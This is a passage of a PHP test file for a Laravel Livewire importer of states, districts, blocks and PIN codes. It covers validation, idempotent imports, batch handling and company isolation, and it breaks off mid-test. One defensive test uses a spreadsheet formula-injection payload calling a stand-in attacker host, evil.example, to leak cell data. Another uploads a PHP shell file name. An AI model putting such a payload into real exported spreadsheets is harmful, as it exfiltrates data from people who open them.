<?php

use App\Modules\Masters\Http\Livewire\Geography\GeographyImport;
use App\Modules\Masters\Models\Block;
use App\Modules\Masters\Models\District;
use App\Modules\Masters\Models\PinCode;
use App\Modules\Masters\Models\State;
use App\Modules\Masters\Services\PinCodeLookup;
use App\Modules\Shared\Enums\ImportStatus;
use App\Modules\Shared\Exceptions\TenantAccessException;
use App\Modules\Shared\Imports\ImporterRegistry;
use App\Modules\Shared\Jobs\ProcessImportBatch;
use App\Modules\Shared\Models\ActivityLog;
use App\Modules\Shared\Models\ImportBatch;
use App\Modules\Shared\Models\ImportBatchError;
use App\Modules\Shared\Models\Scopes\Tenancy;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Gate;
use Illuminate\Support\Facades\Storage;
use Livewire\Features\SupportLockedProperties\CannotUpdateLockedPropertyException;
use Livewire\Livewire;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use PhpOffice\PhpSpreadsheet\Spreadsheet;
use PhpOffice\PhpSpreadsheet\Writer\Xlsx;
use Spatie\Permission\Models\Role;

const GEO_HEADINGS = ['State', 'District', 'Block', 'PIN Code', 'Locality'];

beforeEach(function () {
    Storage::fake('local');

    $this->acme = makeCompany('ACME');
    $this->globex = makeCompany('GLOBEX');
    seedDefaults($this->acme);
    seedDefaults($this->globex);

    $this->admin = makeUser(['Company Admin'], [$this->acme]);
    $this->globexAdmin = makeUser(['Company Admin'], [$this->globex]);

    Role::findOrCreate('Geography viewer')->givePermissionTo('geography.view');
    $this->viewer = makeUser(['Geography viewer'], [$this->acme]);
});

/** Four clean rows: 3 districts, 4 blocks, 4 PIN rows (spreadsheet rows 2–5). */
function geoRows(): array
{
    return [
        ['Gujarat', 'Surat', 'Choryasi', '395003', 'Surat City'],
        ['Gujarat', 'Surat', 'Olpad', '394540', ''],
        ['Gujarat', 'Ahmedabad', 'Daskroi', '380001', 'Khanpur'],
        ['Maharashtra', 'Pune', 'Haveli', '411001', 'Pune City'],
    ];
}

/** Upload through the wizard (which checks it straight away: the test queue is synchronous). */
function geoUpload($user, array $rows, string $extension = 'xlsx', ?array $headings = null)
{
    return Livewire::actingAs($user)->test(GeographyImport::class)
        ->set('file', spreadsheetUpload($headings ?? GEO_HEADINGS, $rows, $extension))->call('uploadAndCheck');
}

function lastBatch(): ImportBatch
{
    return ImportBatch::withoutGlobalScopes(Tenancy::SCOPES)->latest('id')->firstOrFail();
}

function geoCounts(int $companyId): array
{
    $count = fn (string $model) => $model::withoutGlobalScopes(Tenancy::SCOPES)->withTrashed()->where('company_id', $companyId)->count();

    return ['districts' => $count(District::class), 'blocks' => $count(Block::class), 'pins' => $count(PinCode::class)];
}

function findDistrict(int $companyId, string $name): ?District
{
    return District::withoutGlobalScopes(Tenancy::SCOPES)->withTrashed()->where('company_id', $companyId)->where('name', $name)->first();
}

// ======================================================================================================
// Template and access
// ======================================================================================================

it('registers the geography importer', function () {
    $importer = app(ImporterRegistry::class)->get('geography');

    expect($importer->permission())->toBe('geography.import')
        ->and(array_map(fn ($c) => $c->heading, $importer->columns()))->toBe(GEO_HEADINGS);
});

it('downloads a template with headings only on the Data sheet and an Instructions sheet', function () {
    $response = $this->actingAs($this->admin)->get(route('imports.template', 'geography'))->assertOk();

    $book = IOFactory::load($response->baseResponse->getFile()->getPathname());

    expect($book->getSheetNames())->toBe(['Data', 'Instructions'])
        ->and($book->getSheetByName('Data')->toArray())->toBe([GEO_HEADINGS])      // headings and not a single data row
        ->and(collect($book->getSheetByName('Instructions')->toArray())->flatten()->implode(' '))
        ->toContain('never creates states')->toContain('Surat')->toContain('PIN Code');
});

it('accepts the downloaded template as an upload (it is simply empty)', function () {
    $template = $this->actingAs($this->admin)->get(route('imports.template', 'geography'))->baseResponse->getFile();

    Livewire::actingAs($this->admin)->test(GeographyImport::class)
        ->set('file', UploadedFile::fake()->createWithContent('template.xlsx', $template->getContent()))->call('uploadAndCheck')
        ->assertHasNoErrors()->assertSee('nothing to import');

    expect(lastBatch())->status->toBe(ImportStatus::Checked)->total_rows->toBe(0);
});

it('only lets people who may import fetch the template or open the page', function () {
    $this->get(route('imports.template', 'geography'))->assertRedirect(route('login'));
    $this->actingAs($this->viewer)->get(route('imports.template', 'geography'))->assertForbidden();
    $this->actingAs($this->viewer)->get(route('masters.geography.import'))->assertForbidden();
    $this->actingAs(makeUser(['Tele-caller'], [$this->acme]))->get(route('masters.geography.import'))->assertForbidden();

    $this->actingAs($this->admin)->get(route('masters.geography.import'))->assertOk()->assertSee('Download template')->assertSee('Upload and check');
    $this->actingAs($this->admin)->get(route('imports.template', 'nonsense'))->assertNotFound();
});

it('keeps the import tab out of sight for people who cannot import', function () {
    $this->actingAs($this->viewer)->get(route('masters.geography.states'))->assertOk()->assertDontSee('>Import<', false);
    $this->actingAs($this->admin)->get(route('masters.geography.states'))->assertSee('>Import<', false);
});

// ======================================================================================================
// The check (a dry run)
// ======================================================================================================

it('checks a clean file and reports what it would do without saving anything', function () {
    $before = geoCounts($this->acme->id);

    geoUpload($this->admin, geoRows())->assertSee('New district Surat')->assertSee('Import 4 valid row(s)');

    $batch = lastBatch();
    expect($batch)->status->toBe(ImportStatus::Checked)->total_rows->toBe(4)->valid_rows->toBe(4)
        ->created_count->toBe(4)->updated_count->toBe(0)->unchanged_count->toBe(0)->error_count->toBe(0)
        ->and($batch->summary['counters'])->toMatchArray(['districts_created' => 3, 'blocks_created' => 4, 'pins_created' => 4])
        ->and($batch->summary['preview'])->toHaveCount(4)
        ->and(geoCounts($this->acme->id))->toBe($before);   // nothing written
});

it('lets later rows build on what earlier rows would create', function () {
    geoUpload($this->admin, [
        ['Gujarat', 'Rajkot', '', '360001', ''],
        ['Gujarat', 'Rajkot', 'Kotda', '360002', 'Kotda Sangani'],
    ]);

    expect(lastBatch())->created_count->toBe(2)->error_count->toBe(0)
        ->and(lastBatch()->summary['counters'])->toMatchArray(['districts_created' => 1, 'blocks_created' => 1, 'pins_created' => 2]);
});

it('rejects bad rows with the exact spreadsheet row number and keeps the cells as uploaded', function () {
    geoUpload($this->admin, [
        ['Atlantis', 'Surat', 'Choryasi', '395003', ''],         // 2 unknown state
        ['Gujarat', '', 'Choryasi', '395003', ''],               // 3 no district
        ['Gujarat', 'Surat', '', '', ''],                        // 4 neither block nor PIN
        ['Gujarat', 'Surat', 'Choryasi', '39500', ''],           // 5 short PIN
        ['Gujarat', 'Surat', 'Choryasi', '', 'Surat City'],      // 6 locality with no PIN
        ['Gujarat', 'Surat', 'Choryasi', '095003', ''],          // 7 PIN starts with 0
        ['Gujarat', 'Surat', 'Olpad', '394540', ''],             // 8 fine
        ['', 'Surat', 'Olpad', '394540', ''],                    // 9 no state
        ['Gujarat', str_repeat('D', 256), 'Olpad', '', ''],      // 10 district too long
    ]);

    $batch = lastBatch();
    expect($batch)->total_rows->toBe(9)->valid_rows->toBe(1)->error_count->toBe(8)->created_count->toBe(1);

    $errors = ImportBatchError::query()->where('import_batch_id', $batch->id)->orderBy('row_number')->get()->keyBy('row_number');

    expect($errors->keys()->all())->toBe([2, 3, 4, 5, 6, 7, 9, 10])
        ->and($errors[2]->messages[0])->toContain('Atlantis')->toContain('not one of this company')
        ->and($errors[2]->raw)->toMatchArray(['state' => 'Atlantis', 'district' => 'Surat', 'pin_code' => '395003'])
        ->and($errors[3]->messages)->toContain('District is required.')
        ->and($errors[4]->messages)->toContain('Give a Block, a PIN Code, or both.')
        ->and($errors[5]->messages[0])->toContain('39500')->toContain('6-digit')
        ->and($errors[6]->messages)->toContain('A Locality needs a PIN Code.')
        ->and($errors[7]->messages[0])->toContain('095003')
        ->and($errors[9]->messages)->toContain('State is required.')
        ->and($errors[10]->messages)->toContain('District must be 255 characters or fewer.')
        ->and($errors->pluck('phase')->unique()->all())->toBe(['check']);
});

it('reports every problem on a row, not only the first', function () {
    geoUpload($this->admin, [['Atlantis', '', '', '12', '']]);

    $messages = ImportBatchError::query()->where('import_batch_id', lastBatch()->id)->firstOrFail()->messages;

    expect($messages)->toHaveCount(3);   // state, district, PIN (the block-or-PIN rule is satisfied by a PIN being present)
});

it('matches headings loosely, ignores extra columns and does not care about their order', function () {
    geoUpload($this->admin, [['395003', 'x', 'Surat', 'Gujarat', 'Choryasi']], 'xlsx', ['pin code *', 'Remarks', 'DISTRICT', ' state ', 'block']);

    expect(lastBatch())->status->toBe(ImportStatus::Checked)->created_count->toBe(1)->error_count->toBe(0)
        ->and(lastBatch()->summary['ignored_columns'])->toBe(['Remarks']);
});

it('fails the whole file, with a plain message, when a required column is missing', function () {
    geoUpload($this->admin, [['Gujarat', 'Surat']], 'xlsx', ['State', 'Town'])->assertSee('Missing: District');

    expect(lastBatch())->status->toBe(ImportStatus::Failed)->and(lastBatch()->failure_reason)->toContain('Missing: District')->toContain('template');
});

it('rejects a file that lists the same column twice', function () {
    geoUpload($this->admin, [['Gujarat', 'Surat', 'x']], 'xlsx', ['State', 'District', 'district']);

    expect(lastBatch())->status->toBe(ImportStatus::Failed)->and(lastBatch()->failure_reason)->toContain('appears more than once');
});

it('reads numbers, GST codes, state codes and untidy text the way people type them', function () {
    geoUpload($this->admin, [
        ['  gujarat ', 'Surat', 'Choryasi', 395003, ''],         // lower case, spaces, PIN typed as a number
        [24, 'Surat', 'Olpad', '394 540', ''],                   // GST code as a number, space inside the PIN
        ['GJ', "Ahmedabad\u{00A0}", 'Daskroi', '380001', ''],    // state code, non-breaking space
        ['MH', 'Pune', 'Haveli', 411001.0, ''],                  // a float cell
    ]);

    expect(lastBatch())->created_count->toBe(4)->error_count->toBe(0)
        ->and(lastBatch()->summary['counters'])->toMatchArray(['districts_created' => 3, 'pins_created' => 4]);
});

it('does not accept a PIN written as text with a decimal point', function () {
    geoUpload($this->admin, [['Gujarat', 'Surat', 'Choryasi', '395003.0', '']], 'csv');

    expect(lastBatch())->error_count->toBe(1)
        ->and(ImportBatchError::query()->where('import_batch_id', lastBatch()->id)->firstOrFail()->messages[0])->toContain('395003.0');
});

it('skips blank rows without counting them and numbers the rest as in Excel', function () {
    geoUpload($this->admin, [
        ['Gujarat', 'Surat', 'Choryasi', '395003', ''],
        ['', '', '', '', ''],
        ['Atlantis', 'Surat', 'Olpad', '', ''],
    ]);

    expect(lastBatch())->total_rows->toBe(2)
        ->and(ImportBatchError::query()->where('import_batch_id', lastBatch()->id)->value('row_number'))->toBe(4);
});

it('reads CSV files, including semicolons, a byte-order mark and Windows-1252 text', function () {
    $csv = fn (string $content) => UploadedFile::fake()->createWithContent('geo.csv', $content);

    $component = Livewire::actingAs($this->admin)->test(GeographyImport::class);
    $component->set('file', $csv("\u{FEFF}State;District;Block;PIN Code;Locality\r\nGujarat;Surat;Choryasi;395003;Surat City\r\nGujarat;Rajkot;;360001;\r\n"))->call('uploadAndCheck');
    expect(lastBatch())->status->toBe(ImportStatus::Checked)->total_rows->toBe(2)->error_count->toBe(0);

    // "Zürich" in Windows-1252
    Livewire::actingAs($this->admin)->test(GeographyImport::class)->call('newImport')
        ->set('file', $csv("State,District,Block,PIN Code,Locality\nGujarat,Z\xFCrich,,395003,\n"))->call('uploadAndCheck');
    expect(lastBatch()->summary['preview'][0]['detail'])->toContain('New district Zürich');
});

it('reads the Data sheet even when it is not the first sheet', function () {
    $book = new Spreadsheet;
    $book->getActiveSheet()->setTitle('Instructions')->fromArray([['Read me'], ['State', 'Not', 'Data']]);
    $book->createSheet()->setTitle('Data')->fromArray([GEO_HEADINGS, ['Gujarat', 'Surat', 'Choryasi', '395003', '']]);
    $path = tempnam(sys_get_temp_dir(), 'fz');
    (new Xlsx($book))->save($path);

    Livewire::actingAs($this->admin)->test(GeographyImport::class)
        ->set('file', UploadedFile::fake()->createWithContent('two-sheets.xlsx', file_get_contents($path)))->call('uploadAndCheck');
    unlink($path);

    expect(lastBatch())->status->toBe(ImportStatus::Checked)->total_rows->toBe(1)->created_count->toBe(1);
});

it('treats a repeated identical row as already covered, and a contradicting one as an error', function () {
    geoUpload($this->admin, [
        ['Gujarat', 'Surat', 'Choryasi', '395003', 'Surat City'],   // 2
        ['Gujarat', 'Surat', 'Choryasi', '395003', 'Surat City'],   // 3 exact repeat
        ['Gujarat', 'Surat', 'Olpad', '395003', 'Surat City'],      // 4 same PIN + locality, different block
        ['Gujarat', 'Surat', 'Olpad', '395003', 'Another post office'], // 5 fine: other locality
    ]);

    $batch = lastBatch();
    $error = ImportBatchError::query()->where('import_batch_id', $batch->id)->firstOrFail();

    expect($batch)->created_count->toBe(2)->unchanged_count->toBe(1)->error_count->toBe(1)
        ->and($batch->summary['counters']['repeated_rows'])->toBe(1)
        ->and($error->row_number)->toBe(4)->and($error->messages[0])->toContain('row 2')->toContain('conflicts');
});

it('catches a contradiction against a block that does not exist yet, and across chunk boundaries', function () {
    config(['formezy.imports.chunk_rows' => 2]);

    geoUpload($this->admin, [
        ['Gujarat', 'Surat', 'Choryasi', '395003', 'Surat City'],   // 2
        ['Gujarat', 'Surat', 'Choryasi', '395004', ''],             // 3
        ['Gujarat', 'Surat', 'Choryasi', '395005', ''],             // 4  (second chunk starts)
        ['Gujarat', 'Surat', 'Brand new block', '395003', 'Surat City'], // 5 contradicts row 2 (block not created yet)
        ['Gujarat', 'Surat', 'Olpad', '395006', ''],                // 6
    ]);

    $error = ImportBatchError::query()->where('import_batch_id', lastBatch()->id)->firstOrFail();

    expect(lastBatch())->total_rows->toBe(5)->error_count->toBe(1)->created_count->toBe(4)
        ->and($error->row_number)->toBe(5)->and($error->messages[0])->toContain('row 2');
});

// ======================================================================================================
// The import itself
// ======================================================================================================

it('imports the valid rows once confirmed, as the uploader, inside the right company', function () {
    $component = geoUpload($this->admin, geoRows())->call('confirmImport');

    $component->assertSee('Import finished');
    expect(lastBatch())->status->toBe(ImportStatus::Completed)->processed_rows->toBe(4)->created_count->toBe(4)->error_count->toBe(0)
        ->and(geoCounts($this->acme->id))->toBe(['districts' => 3, 'blocks' => 4, 'pins' => 4])
        ->and(geoCounts($this->globex->id))->toBe(['districts' => 0, 'blocks' => 0, 'pins' => 0]);

    $pin = PinCode::withoutGlobalScopes(Tenancy::SCOPES)->where('company_id', $this->acme->id)->where('pin_code', '395003')->firstOrFail();

    expect($pin->area)->toBe('Surat City')
        ->and($pin->state->name)->toBe('Gujarat')->and($pin->district->name)->toBe('Surat')->and($pin->block->name)->toBe('Choryasi')
        ->and($pin->created_by)->toBe($this->admin->id)
        ->and(PinCode::withoutGlobalScopes(Tenancy::SCOPES)->where('pin_code', '394540')->value('area'))->toBe('');
});

it('makes the imported data immediately usable by the PIN lookup', function () {
    geoUpload($this->admin, geoRows())->call('confirmImport');

    $this->actingAs($this->admin);
    $result = app(PinCodeLookup::class)->resolve('395003');

    expect($result->found)->toBeTrue()->and($result->state->name)->toBe('Gujarat')->and($result->district->name)->toBe('Surat')->and($result->block->name)->toBe('Choryasi');
});

it('is idempotent: uploading the same file again changes nothing', function () {
    geoUpload($this->admin, geoRows())->call('confirmImport');
    $after = geoCounts($this->acme->id);

    $second = geoUpload($this->admin, geoRows())->assertSee('nothing to import');
    $batch = lastBatch();

    expect($batch)->status->toBe(ImportStatus::Checked)->created_count->toBe(0)->updated_count->toBe(0)->unchanged_count->toBe(4)
        ->and(geoCounts($this->acme->id))->toBe($after);

    $second->call('confirmImport')->assertHasErrors(['batch']);
    expect(lastBatch())->status->toBe(ImportStatus::Checked);
});

it('adds only what is missing when a bigger file overlaps an earlier one', function () {
    geoUpload($this->admin, geoRows())->call('confirmImport');

    geoUpload($this->admin, [...geoRows(), ['Gujarat', 'Surat', 'Choryasi', '395007', 'Adajan']])->call('confirmImport');

    expect(lastBatch())->created_count->toBe(1)->unchanged_count->toBe(4)->and(geoCounts($this->acme->id))->toBe(['districts' => 3, 'blocks' => 4, 'pins' => 5]);
});

it('matches existing names ignoring case, accents and spacing instead of creating look-alikes', function () {
    geoUpload($this->admin, [['Gujarat', 'Surat', 'Choryasi', '395003', 'Surat City']])->call('confirmImport');

    geoUpload($this->admin, [['GUJARAT', '  SURAT ', 'choryasí', '395003', 'surat  city']])->assertSee('Everything in this file is already in the system');

    expect(lastBatch())->unchanged_count->toBe(1)->created_count->toBe(0)
        ->and(geoCounts($this->acme->id))->toBe(['districts' => 1, 'blocks' => 1, 'pins' => 1]);
});

it('keeps one row per locality, so a PIN can have several', function () {
    geoUpload($this->admin, [
        ['Gujarat', 'Surat', 'Choryasi', '395003', 'Surat City'],
        ['Gujarat', 'Surat', 'Choryasi', '395003', 'Surat Bazaar'],
        ['Gujarat', 'Surat', 'Choryasi', '395003', ''],
    ])->call('confirmImport');

    expect(PinCode::withoutGlobalScopes(Tenancy::SCOPES)->where('pin_code', '395003')->count())->toBe(3);
});

it('replaces a different block, but never erases a block with an empty cell', function () {
    seedGeography($this->acme);   // 380001 Khanpur -> Daskroi

    $component = geoUpload($this->admin, [['Gujarat', 'Ahmedabad', 'Sanand', '380001', 'Khanpur']])->assertSee('Updates PIN 380001');
    expect(lastBatch())->updated_count->toBe(1)->created_count->toBe(0);
    $component->call('confirmImport');

    $pin = fn () => PinCode::withoutGlobalScopes(Tenancy::SCOPES)->where('company_id', $this->acme->id)->where('pin_code', '380001')->firstOrFail();
    expect($pin()->block->name)->toBe('Sanand');

    geoUpload($this->admin, [['Gujarat', 'Ahmedabad', '', '380001', 'Khanpur']]);   // block cell left empty
    expect(lastBatch())->unchanged_count->toBe(1)->updated_count->toBe(0)
        ->and($pin()->block->name)->toBe('Sanand');
});

it('fills in a missing block on an existing PIN row', function () {
    seedGeography($this->acme);
    PinCode::withoutGlobalScopes(Tenancy::SCOPES)->where('company_id', $this->acme->id)->where('pin_code', '395003')->update(['block_id' => null]);

    geoUpload($this->admin, [['Gujarat', 'Surat', 'Choryasi', '395003', 'Surat City']])->call('confirmImport');

    expect(PinCode::withoutGlobalScopes(Tenancy::SCOPES)->where('company_id', $this->acme->id)->where('pin_code', '395003')->firstOrFail()->block->name)->toBe('Choryasi');
});

it('imports the good rows and skips the bad ones, reporting both', function () {
    $component = geoUpload($this->admin, [
        ['Gujarat', 'Surat', 'Choryasi', '395003', ''],
        ['Atlantis', 'Surat', 'Olpad', '394540', ''],
        ['Gujarat', 'Rajkot', 'Kotda', '360002', ''],
    ])->assertSee('skipped')->call('confirmImport');

    $batch = lastBatch();
    expect($batch)->status->toBe(ImportStatus::Completed)->created_count->toBe(2)->error_count->toBe(1)
        ->and(geoCounts($this->acme->id))->toBe(['districts' => 2, 'blocks' => 2, 'pins' => 2])
        ->and(ImportBatchError::query()->where('import_batch_id', $batch->id)->get())->toHaveCount(1)
        ->and(ImportBatchError::query()->where('import_batch_id', $batch->id)->value('phase'))->toBe('apply');

    $component->assertSee('Rejected rows')->assertSee('Atlantis');
});

it('never reactivates a record somebody deactivated, but restores one that was deleted', function () {
    $geo = seedGeography($this->acme);
    District::withoutGlobalScopes(Tenancy::SCOPES)->whereKey($geo['surat']->id)->update(['status' => 'inactive']);
    $geo['daskroi']->delete();   // soft delete

    geoUpload($this->admin, [
        ['Gujarat', 'Surat', 'Choryasi', '395003', 'Surat City'],      // district inactive
        ['Gujarat', 'Ahmedabad', 'Daskroi', '380001', 'Khanpur'],       // block was deleted
    ])->call('confirmImport');

    $error = ImportBatchError::query()->where('import_batch_id', lastBatch()->id)->firstOrFail();

    expect($error->row_number)->toBe(2)->and($error->messages[0])->toContain('inactive')->toContain('Surat')
        ->and(lastBatch())->updated_count->toBe(1)->error_count->toBe(1)
        ->and(Block::withoutGlobalScopes(Tenancy::SCOPES)->whereKey($geo['daskroi']->id)->firstOrFail()->trashed())->toBeFalse()
        ->and(District::withoutGlobalScopes(Tenancy::SCOPES)->whereKey($geo['surat']->id)->value('status'))->toBe('inactive');
});

it('refuses a row that touches an inactive PIN row or block', function () {
    $geo = seedGeography($this->acme);
    Block::withoutGlobalScopes(Tenancy::SCOPES)->whereKey($geo['sanand']->id)->update(['status' => 'inactive']);
    PinCode::withoutGlobalScopes(Tenancy::SCOPES)->where('company_id', $this->acme->id)->where('pin_code', '411001')->update(['status' => 'inactive']);

    geoUpload($this->admin, [
        ['Gujarat', 'Ahmedabad', 'Sanand', '382110', 'Sanand Road'],
        ['Maharashtra', 'Pune', 'Haveli', '411001', 'Pune City'],
    ]);

    $messages = ImportBatchError::query()->where('import_batch_id', lastBatch()->id)->orderBy('row_number')->get()->pluck('messages.0');

    expect($messages[0])->toContain('Block “Sanand” is inactive')->and($messages[1])->toContain('PIN code 411001')->toContain('inactive');
});

it('records the import as one audit entry instead of one per row', function () {
    geoUpload($this->admin, geoRows())->call('confirmImport');

    $perRow = ActivityLog::withoutGlobalScopes()->whereIn('log_name', ['districts', 'blocks', 'pin_codes'])->count();
    $summary = ActivityLog::withoutGlobalScopes()->where('event', 'import_completed')->get();

    expect($perRow)->toBe(0)
        ->and($summary)->toHaveCount(1)
        ->and($summary->first()->causer_id)->toBe($this->admin->id)
        ->and($summary->first()->company_id)->toBe($this->acme->id)
        ->and($summary->first()->properties->all())->toMatchArray(['importer' => 'geography', 'file' => 'geography.xlsx', 'rows' => 4, 'created' => 4, 'rejected' => 0, 'districts_created' => 3]);
});

it('imports in chunks and still gets every row, in the right order', function () {
    config(['formezy.imports.chunk_rows' => 3]);
    $rows = collect(range(1, 10))->map(fn ($i) => ['Gujarat', 'Rajkot', 'Block '.$i, (string) (360000 + $i), ''])->all();

    geoUpload($this->admin, $rows)->call('confirmImport');

    expect(lastBatch())->status->toBe(ImportStatus::Completed)->total_rows->toBe(10)->created_count->toBe(10)
        ->and(geoCounts($this->acme->id))->toBe(['districts' => 1, 'blocks' => 10, 'pins' => 10]);
});

// ======================================================================================================
// State of the batch: confirm once, discard, retry
// ======================================================================================================

it('applies a confirmed batch only once, however many times confirm is pressed', function () {
    $component = geoUpload($this->admin, geoRows())->call('confirmImport');
    $after = geoCounts($this->acme->id);

    $component->call('confirmImport')->assertHasErrors(['batch']);

    expect(lastBatch())->status->toBe(ImportStatus::Completed)->and(geoCounts($this->acme->id))->toBe($after)
        ->and(ActivityLog::withoutGlobalScopes()->where('event', 'import_completed')->count())->toBe(1);
});

it('cannot import a file that has not been checked, or has failed its check', function () {
    $batch = geoUpload($this->admin, [['Gujarat', 'Surat']], 'xlsx', ['State', 'Town']);   // fails the check
    $batch->call('confirmImport')->assertHasErrors(['batch']);

    expect(lastBatch())->status->toBe(ImportStatus::Failed)->and(geoCounts($this->acme->id)['districts'])->toBe(0);
});

it('discards an upload', function () {
    $component = geoUpload($this->admin, geoRows())->call('discard');

    expect(lastBatch())->status->toBe(ImportStatus::Cancelled)->and($component->get('batchId'))->toBeNull()
        ->and(geoCounts($this->acme->id)['districts'])->toBe(0);
});

it('checks again on request, replacing the earlier findings', function () {
    $component = geoUpload($this->admin, [['Atlantis', 'Surat', 'Choryasi', '', '']]);
    expect(lastBatch()->error_count)->toBe(1);

    // The file was wrong because the state was missing: add it, then re-check the same upload.
    State::withoutGlobalScopes(Tenancy::SCOPES)->where('company_id', $this->acme->id)->where('gst_code', '36')
        ->update(['name' => 'Atlantis']);

    $component->call('recheck');

    expect(lastBatch())->error_count->toBe(0)->created_count->toBe(1)
        ->and(ImportBatchError::query()->where('import_batch_id', lastBatch()->id)->count())->toBe(0);
});

it('retries an import that stopped, without duplicating anything', function () {
    $component = geoUpload($this->admin, geoRows());
    $batch = lastBatch();

    // Pretend the worker died after the first chunk: some rows are in, the batch is marked failed during apply.
    geoUpload($this->admin, [geoRows()[0]])->call('confirmImport');
    $batch->forceFill(['status' => ImportStatus::Failed, 'failure_reason' => 'The import stopped', 'summary' => [...$batch->summary, 'failed_during' => 'apply']])->save();

    $component->call('openBatch', $batch->id)->assertSee('Retry import')->call('confirmImport');

    expect($batch->fresh())->status->toBe(ImportStatus::Completed)
        ->and(geoCounts($this->acme->id))->toBe(['districts' => 3, 'blocks' => 4, 'pins' => 4]);
});

it('lets a person free a batch whose worker died, but not one that is merely slow', function () {
    $component = geoUpload($this->admin, geoRows());
    $batch = lastBatch();
    $batch->forceFill(['status' => ImportStatus::Processing])->save();

    $component->call('openBatch', $batch->id)->call('markStuck')->assertHasErrors(['batch']);
    expect($batch->fresh()->status)->toBe(ImportStatus::Processing);

    ImportBatch::withoutGlobalScopes(Tenancy::SCOPES)->whereKey($batch->id)->update(['updated_at' => now()->subHour()]);
    $component->call('openBatch', $batch->id)->call('markStuck');

    expect($batch->fresh())->status->toBe(ImportStatus::Failed)->and($batch->fresh()->failure_reason)->toContain('background worker');
});

it('shows progress while a job is working and polls for updates', function () {
    $component = geoUpload($this->admin, geoRows());
    lastBatch()->forceFill(['status' => ImportStatus::Processing, 'total_rows' => 200, 'processed_rows' => 50])->save();

    $component->call('openBatch', lastBatch()->id)->assertSee('Importing…')->assertSee('50 of about 200 rows')->assertSeeHtml('wire:poll.2s')->assertSeeHtml('width: 25%');
});

it('resumes the open batch after a reload', function () {
    geoUpload($this->admin, geoRows());

    Livewire::actingAs($this->admin)->test(GeographyImport::class)->assertSet('batchId', lastBatch()->id)->assertSee('geography.xlsx')->assertSee('Import 4 valid row(s)');
});

// ======================================================================================================
// Hostile and broken files
// ======================================================================================================

it('turns away files that are not real spreadsheets before storing them', function (string $name, string $content, string $message) {
    Livewire::actingAs($this->admin)->test(GeographyImport::class)
        ->set('file', UploadedFile::fake()->createWithContent($name, $content))->call('uploadAndCheck')->assertHasErrors(['file'])->assertSee($message);

    expect(ImportBatch::withoutGlobalScopes(Tenancy::SCOPES)->count())->toBe(0)->and(Storage::disk('local')->allFiles('imports'))->toBe([]);
})->with([
    'not a zip' => ['fake.xlsx', 'this is not a workbook', 'not a valid Excel'],
    'zip without a workbook' => ['fake.xlsx', zipWith('hello.txt', 'hi'), 'not a valid Excel'],
    'binary in a csv' => ['fake.csv', "State,District\n\0\0\0\0", 'does not look like a CSV'],
]);

function zipWith(string $name, string $content): string
{
    $path = tempnam(sys_get_temp_dir(), 'fz');
    $zip = new ZipArchive;
    $zip->open($path, ZipArchive::OVERWRITE);
    $zip->addFromString($name, $content);
    $zip->close();
    $bytes = (string) file_get_contents($path);
    unlink($path);

    return $bytes;
}

it('only accepts spreadsheet extensions and sensible sizes', function () {
    $component = Livewire::actingAs($this->admin)->test(GeographyImport::class);

    $component->set('file', UploadedFile::fake()->createWithContent('shell.php', '<?php echo 1;'))->call('uploadAndCheck')->assertHasErrors(['file' => 'extensions']);
    $component->set('file', UploadedFile::fake()->create('huge.xlsx', 11000))->call('uploadAndCheck')->assertHasErrors(['file' => 'max']);
    $component->set('file', null)->call('uploadAndCheck')->assertHasErrors(['file' => 'required']);

    expect(ImportBatch::withoutGlobalScopes(Tenancy::SCOPES)->count())->toBe(0);
});

it('refuses a workbook that would be enormous once unpacked', function () {
    config(['formezy.imports.max_unpacked_mb' => 0]);

    Livewire::actingAs($this->admin)->test(GeographyImport::class)
        ->set('file', spreadsheetUpload(GEO_HEADINGS, geoRows()))->call('uploadAndCheck')->assertHasErrors(['file'])->assertSee('too large once unpacked');
});

it('stops at the row limit instead of chewing through an endless file', function () {
    config(['formezy.imports.max_rows' => 3]);

    geoUpload($this->admin, geoRows());

    expect(lastBatch())->status->toBe(ImportStatus::Failed)->and(lastBatch()->failure_reason)->toContain('more than 3 rows')
        ->and(geoCounts($this->acme->id)['districts'])->toBe(0);
});

it('fails clearly, not with a crash, when the stored file has gone', function () {
    $component = geoUpload($this->admin, geoRows());
    Storage::disk('local')->delete(lastBatch()->stored_path);

    $component->call('recheck');

    expect(lastBatch())->status->toBe(ImportStatus::Failed)->and(lastBatch()->failure_reason)->toContain('no longer available');
});

it('keeps spreadsheet formulas in an uploaded file inert in the error report', function () {
    $payload = '=HYPERLINK("http://evil.example/?x="&A1,"click")';

    Livewire::actingAs($this->admin)->test(GeographyImport::class)
        ->set('file', spreadsheetUpload(GEO_HEADINGS, [[$payload, 'Surat', '', '395003', '']], 'csv'))->call('uploadAndCheck')
        ->assertSee('not one of this company');

    $response = $this->actingAs($this->admin)->get(route('imports.errors', lastBatch()->id))->assertOk();
    $sheet = IOFactory::load($response->baseResponse->getFile()->getPathname())->getActiveSheet();

    $cell = $sheet->getCell('C2');   // the State cell: Row, Problem, State…
    expect($cell->getValue())->toBe($payload)->and($cell->getDataType())->toBe(DataType::TYPE_STRING);
});

it('writes an error report people can fix and upload again', function () {
    geoUpload($this->admin, [
        ['Gujarat', 'Surat', 'Choryasi', '395003', ''],
        ['Atlantis', 'Surat', 'Olpad', '394540', 'Somewhere'],
    ]);

    $response = $this->actingAs($this->admin)->get(route('imports.errors', lastBatch()->id))->assertOk();
    $rows = IOFactory::load($response->baseResponse->getFile()->getPathname())->getActiveSheet()->toArray();

    expect($rows[0])->toBe(['Row', 'Problem', ...GEO_HEADINGS])
        ->and($rows[1][0])->toBe('3')->and($rows[1][1])->toContain('Atlantis')
        ->and(array_slice($rows[1], 2))->toBe(['Atlantis', 'Surat', 'Olpad', '394540', 'Somewhere'])
        ->and($rows)->toHaveCount(2);
});

// ======================================================================================================
// Tenancy and permissions
// ======================================================================================================

it('keeps each company’s imports apart, even for the same file', function () {
    geoUpload($this->admin, geoRows())->call('confirmImport');
    geoUpload($this->globexAdmin, geoRows())->call('confirmImport');

    expect(geoCounts($this->acme->id))->toBe(['districts' => 3, 'blocks' => 4, 'pins' => 4])
        ->and(geoCounts($this->globex->id))->toBe(['districts' => 3, 'blocks' => 4, 'pins' => 4])
        ->and(ImportBatch::withoutGlobalScopes(Tenancy::SCOPES)->where('company_id', $this->acme->id)->count())->toBe(1);
});

it('does not show or open another company’s batches', function () {
    geoUpload($this->admin, [['Atlantis', 'Surat', 'Choryasi', '', '']]);
    $acmeBatch = lastBatch();

